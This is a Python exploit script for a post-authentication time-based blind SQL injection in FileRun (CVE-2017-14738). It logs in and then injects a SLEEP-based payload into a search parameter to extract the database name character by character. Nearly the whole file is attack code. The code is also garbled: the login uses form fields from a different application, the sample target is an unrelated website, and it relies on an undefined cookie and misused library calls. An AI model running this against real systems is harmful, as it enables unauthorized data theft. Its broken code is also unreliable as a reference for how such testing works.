#!/usr/bin/env python
# Exploit Title: FileRun <=2017.09.18
# Date: September 29, 2017
# Exploit Author: SPARC
# Vendor Homepage: https://www.filerun.com/
# Software Link: http://f.afian.se/wl/?id=EHQhXhXLGaMFU7jI8mYNRN8vWkG9LUVP&recipient=d3d3LmZpbGVydW4uY29t
# Version: 2017.09.18
# Tested on: Ubuntu 16.04.3, Apache 2.4.7, PHP 7.0
# CVE : CVE-2017-14738
#
import requests
from bs4 import BeautifulSoup
import random
import os
import argparse
import sys,time,urllib,urllib3
from time import sleep

print("""
#===============================================================#
|                                                               |
|            ___|                   |                           |
|          \___ \  __ \   _ \ __ \  __|  _ \  __| _` |          |
|                | |   |  __/ |   | |    __/ |   (   |          |
|          _____/  .__/ \___|_|  _|\__|\___|_|  \__,_|          |
|                 _|                                            |
|                                                               |
|                   FileRun <= 2017.09.18                       |
|       BlindSQLi Proof of Concept (Post Authentication)        |
|        by Spentera Research (research[at]spentera.id)         |
|                                                               |
#===============================================================#
""")


host = input('enter url (https://nl.hardware.info/register?l=yes) : ')
username = input("[*] Username: ")
password = input("[*] Password: ")
delay=2



def masuk(usr,pswd):
    session = requests.Session()
    # Authenticating
    print("[1] Authenticating")
    r = session.get(host)
    soup = BeautifulSoup(r.text, features="lxml")
    token = soup.findAll('meta')[9].get("content")

    login_form = {
        "authenticity_token": token,
        "user[login]": username,
        "user[password]": password,
        "user[remember_me]": "0"
    }
    r = session.post(host, data=login_form)

    if r.status_code != 200:
        exit("Login Failed")
    else:
        print("Successfully Authenticated")

def konek(m,n):
	#borrow from SQLmap :)
	query=("7) AND (SELECT * FROM (SELECT(SLEEP(%s-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),%s,1))>%s,0,1)))))wSmD) AND (8862=8862" %(delay,m,n))
	values = urllib.urlencode({ 'metafield': query,
        	   'searchType': 'meta',
        	   'keyword': 'work',
        	   'searchPath': '/ROOT/HOME',
	           'path': '/ROOT/SEARCH' })

	req = urllib3.request(host, values)
	req.add_header('Cookie', cookie)
	try:
    		starttime=time.time()
    		response = urllib3.urlopen(req)
    		endtime = time.time()
    		return int(endtime-starttime)

	except:
    		print('\n[-] Uh oh! Exploit fail..')
    		sys.exit(0)

print("[+] Logging in to the application...")
sleep(1)
cekmasuk = masuk(username,password)
print("[*] Using Time-Based method with %ds delay."%int(delay))
print("[+] Starting to dump current database. This might take time..")
sys.stdout.write('[+] Target current database is: ')
sys.stdout.flush()

starttime = time.time()
for m in range(1,256):
	for n in range(32,126):
		wkttunggu = konek(m,n)
		if (wkttunggu < delay):
			sys.stdout.write(chr(n))
			sys.stdout.flush()
			break
endtime = time.time()
print("\n[+] Done in %d seconds" %int(endtime-starttime))
